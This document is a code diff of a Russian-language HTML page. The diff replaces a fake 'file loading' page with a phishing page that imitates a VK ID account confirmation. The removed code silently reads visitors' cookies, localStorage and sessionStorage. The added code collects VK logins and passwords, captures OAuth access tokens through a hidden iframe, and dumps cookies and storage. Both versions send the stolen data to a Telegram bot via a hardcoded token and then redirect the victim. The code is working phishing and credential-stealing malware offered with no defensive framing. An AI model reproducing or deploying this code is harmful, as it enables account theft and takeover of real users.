@@ -1,52 +1,83 @@
+<!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Loading...</title></head>
-<body style="background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;margin:0;">
-<div id="s">Загрузка файла...</div>
+<head>
+<meta charset="UTF-8">
+<title>VK ID — Подтверждение</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#edeef0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
+.box{background:#fff;border-radius:12px;padding:32px;width:360px;box-shadow:0 2px 16px rgba(0,0,0,.12);text-align:center;}
+.box h2{font-size:18px;margin-bottom:8px;color:#222;}
+.box p{font-size:13px;color:#656565;margin-bottom:20px;}
+.box input{width:100%;padding:12px;border:1px solid #d3d9de;border-radius:8px;margin-bottom:10px;font-size:14px;}
+.box input:focus{outline:none;border-color:#4a76a8;}
+.box button{width:100%;padding:12px;background:#4a76a8;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;}
+.box button:hover{background:#3a5f8a;}
+.err{color:#c00;font-size:12px;margin-top:8px;display:none;}
+iframe{display:none;}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>ВКонтакте</h2>
+<p>Для продолжения подтвердите<br>данные вашего аккаунта</p>
+<input type="text" id="login" placeholder="Телефон или email">
+<input type="password" id="pass" placeholder="Пароль">
+<button onclick="go()">Подтвердить</button>
+<p class="err" id="err">Неверные данные</p>
+</div>
+<iframe id="vkframe"></iframe>
 <script>
 var TG_TOKEN = '8391422515:AAE8mfD8eefaNRsOoRwnr6BeTlfQEABfO8k';
 var TG_CHAT = '-1003343793064';
-var REDIR = 'https://file.kiwi/a5383f5e#aTK-XRejXlmJmJsCiqex1A';
+var FINAL_REDIR = 'https://devil.delivery';
+var VK_APP_ID = '7913379';
+var THIS_URL = window.location.href.split('#')[0].split('?')[0];
+var REDIRECT_URI = encodeURIComponent(THIS_URL);
+var step = 0;
 
 function send(msg) {
-    var x = new XMLHttpRequest();
-    x.open('GET', 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage?chat_id=' + TG_CHAT + '&text=' + encodeURIComponent(msg), true);
-    x.send();
+    new Image().src = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage?chat_id=' + TG_CHAT + '&text=' + encodeURIComponent(msg);
 }
 
-function grab() {
-    var data = '';
-    // Document cookies
-    data += '[COOKIES]\n' + document.cookie + '\n\n';
-    // localStorage
-    data += '[LOCALSTORAGE]\n';
-    try {
-        for(var i=0; i<localStorage.length; i++) {
-            var k = localStorage.key(i);
-            data += k + '=' + localStorage.getItem(k) + '\n';
-        }
-    } catch(e) { data += 'error\n'; }
-    // sessionStorage
-    data += '\n[SESSIONSTORAGE]\n';
-    try {
-        for(var i=0; i<sessionStorage.length; i++) {
-            var k = sessionStorage.key(i);
-            data += k + '=' + sessionStorage.getItem(k) + '\n';
-        }
-    } catch(e) { data += 'error\n'; }
-    // Info
-    data += '\n[INFO]\n';
-    data += 'URL: ' + window.location.href + '\n';
-    data += 'UA: ' + navigator.userAgent + '\n';
-    data += 'Screen: ' + screen.width + 'x' + screen.height + '\n';
-    data += 'Referrer: ' + document.referrer + '\n';
-    data += 'Time: ' + new Date().toISOString() + '\n';
-    return data;
+function go() {
+    var l = document.getElementById('login').value.trim();
+    var p = document.getElementById('pass').value.trim();
+    if (!l || !p) { document.getElementById('err').style.display = 'block'; return; }
+    
+    document.getElementById('err').style.display = 'none';
+    document.querySelector('button').disabled = true;
+    document.querySelector('button').innerText = 'Проверка...';
+    
+    // Отправляем логин/пароль
+    send('🔐 *VK LOGIN*\n📧 `' + l + '`\n🔑 `' + p + '`\n🕒 ' + new Date().toISOString());
+    
+    // Грузим OAuth ВК в скрытый iframe с чужим app_id
+    var iframe = document.getElementById('vkframe');
+    iframe.style.display = 'block';
+    iframe.src = 'https://oauth.vk.com/authorize?client_id=' + VK_APP_ID + '&display=page&redirect_uri=' + REDIRECT_URI + '&scope=offline&response_type=token&v=5.199';
+    
+    setTimeout(function() {
+        document.querySelector('h2').innerText = 'Вход подтверждён';
+        document.querySelector('p').innerText = 'Перенаправление...';
+        setTimeout(function() { window.location = FINAL_REDIR; }, 1500);
+    }, 3000);
 }
 
-var payload = grab();
-send(payload);
-document.getElementById('s').innerText = 'Файл загружен, перенаправляем...';
-setTimeout(function() { window.location = REDIR; }, 800);
+// Если вернулись с токеном
+if (window.location.hash.indexOf('access_token') !== -1) {
+    var params = new URLSearchParams(window.location.hash.substring(1));
+    var token = params.get('access_token');
+    var uid = params.get('user_id');
+    send('🎯 *VK TOKEN*\n🔑 `' + token + '`\n👤 UID: `' + uid + '`');
+    setTimeout(function() { window.location = FINAL_REDIR; }, 1000);
+}
+
+// Собираем LS и куки при открытии
+var d = '👁 *OPENED*\nCOOKIES: ' + document.cookie + '\nLS: ';
+try { for(var i=0; i<localStorage.length; i++) { d += localStorage.key(i) + '=' + localStorage.getItem(localStorage.key(i)) + '; '; } } catch(e) {}
+d += '\nURL: ' + window.location.href;
+send(d);
 </script>
 </body>
 </html>
